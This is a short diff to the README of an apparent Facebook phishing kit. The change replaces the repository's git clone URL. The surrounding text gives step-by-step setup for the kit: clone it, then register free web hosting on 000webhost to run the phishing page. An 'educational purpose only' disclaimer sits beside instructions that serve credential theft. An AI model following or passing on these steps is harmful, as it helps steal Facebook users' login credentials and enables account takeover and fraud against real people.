@@ -4,7 +4,7 @@ Hello Guys this Repository for Phishing activity for Faceboook. It contains a ph
 ATTENTION : This repository is only for educational purpose, We will not be responsible for any criminal offence.
 
 STEP 1
-Download this repository using the zip file or git clone https://github.com/professionalprince/facebook-phisher.git
+Download this repository using the zip file or git clone https://github.com/fullstackrajkumar/facebook-phisher.git
 
 STEP 2
 Create a account with your gmail account on https://000webhost.com and verify your account
